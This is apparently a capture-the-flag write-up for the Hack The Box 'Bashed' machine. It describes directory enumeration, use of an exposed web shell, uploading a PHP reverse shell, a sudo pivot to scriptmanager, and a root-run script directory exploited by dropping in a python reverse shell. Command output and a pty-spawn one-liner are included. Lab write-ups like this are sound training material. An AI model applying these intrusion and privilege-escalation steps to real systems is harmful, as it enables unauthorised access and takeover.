# recon
- OS: linux TTL 63
- Apache/2.4.18 (Ubuntu) Server at bashed.htb Port 80

- gobuster
```
/about.html (Status: 200)
/config.php (Status: 200)
/contact.html (Status: 200)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/scroll.html (Status: 200)
/server-status (Status: 403)
/single.html (Status: 200)
/uploads (Status: 301)
```
I try to visite `/uploads/phpbash.php` and hope to get a web shell since one of the picture show that directory but Unfortunately.

Anywat after some tries, I found web shell at `/dev` which `www-data` priv I did like the shell that much so I decided to upload `php-reverse-shell.php` (installed by defualt on ur kali) on `/uploads` and gain reverse shell instead.

# foot hold
grab user flag and more recon
```
www-data@bashed:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
so let priv esc to scriptmanager
```
www-data@bashed:/var/www/html/uploads$ sudo -u scriptmanager bash -i
```


# root
```
scriptmanager@bashed:/$ find / -user scriptmanager 2> /dev/null
find / -user scriptmanager 2> /dev/null
/scripts
.
.
```
oh we own /scripts let go check
```
scriptmanager@bashed:~$ ls -ls /scripts
ls -ls /scripts
total 12
4 -rw-r--r-- 1 scriptmanager scriptmanager 214 Sep 22 12:17 test.py
4 -rw-r--r-- 1 root          root           18 Sep 21 15:03 test.txt
```
if you keep `ls -la` you will notice that the file modify time change each min. The plan is put a python reverse shell script. 

you can also make sure about the automate jobs by a tool call `pspy` if you run the tool you will se that
```
2020/09/22 13:15:38 CMD: UID=0    PID=15974  | python test.py 
```
this show us the uid=0 which is root is executing `python test.py`. I also try to create a dummy test2.py and keep monitoring `pspy`. The result show that root user excute any `.py` in `/scripts` directory. 


Since nano dosnt works I decided to create python reverse shell on my kali and use wget to get it to `/script`. Now open netcat and listen to the given port. **BOOM!**
```
root@bashed:/scripts# ls
```
